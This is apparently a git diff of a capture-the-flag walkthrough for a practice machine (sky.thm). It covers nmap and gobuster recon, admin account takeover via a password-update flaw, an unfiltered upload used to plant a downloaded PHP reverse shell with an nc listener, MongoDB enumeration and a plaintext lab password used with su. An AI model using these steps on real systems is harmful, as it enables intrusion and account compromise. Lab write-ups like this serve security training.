@@ -9,7 +9,7 @@
 <pre><code><strong>nmap -A $VICTIM
 </strong></code></pre>
 
-<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -20,7 +20,7 @@
 <pre><code><strong>nmap -sV -sT -O -p 1-65535 $VICTIM
 </strong></code></pre>
 
-<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -32,13 +32,13 @@
 gobuster dir -u $VICTIM -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
 ```
 
-<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
 
 
-
+I go to the /v2/ directory and it forwards me a login, I then create a user.
 
 <figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
 
@@ -46,13 +46,13 @@ gobuster dir -u $VICTIM -w /usr/share/wordlists/SecLists/Discovery/Web-Content/d
 
 
 
+Under profile it tells us the admin email. admin@sky.thm
+
+<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 
-<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
 
-
-
-
+There is a page that allows us to update our password, I try with my account with burp running to intercept.
 
 <figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
 
@@ -66,23 +66,33 @@ gobuster dir -u $VICTIM -w /usr/share/wordlists/SecLists/Discovery/Web-Content/d
 
 
 
-
+I change my email to admin and it seems to work
 
 <figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
 
 
 
-
+I can login as admin
 
 <figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
 
+Under profile there is a page that accepts uploads for profile pictures but there doesn't seem to be any filtering&#x20;
 
 
-**Shell:**[https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)
+
+**Kali**
+
+```
+curl https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+```
+
+Just changed the IP part.
+
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
 
-
+From the source we can see a place where the images are uploaded to
 
 <figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
 
@@ -92,11 +102,72 @@ gobuster dir -u $VICTIM -w /usr/share/wordlists/SecLists/Discovery/Web-Content/d
 nc -lvnp 1234
 ```
 
+directory listing is disabled but we know the name of the file, it doesn't change the name
+
 <figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
+
+Get autocomplete
+
+```
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+ctrl + Z
+stty raw -echo;fg
+```
+
+
+
+## TCP/27017 - Mongo
+
+**Victim**
+
+```
+ss -ltp
+```
+
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+**Victim**
+
+```
+mongo
+```
+
+
+
+**Victim(mongo)**
+
+```
+show dbs
+use backup
+show collections
+db.user.find();
+exit
+```
+
+<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+
+
+**Victim**
+
+```
+su webdeveloper
+Password: BahamasChapp123!@#
+```
+
+
+
+
+
+
+
+
+
+
 
 
 
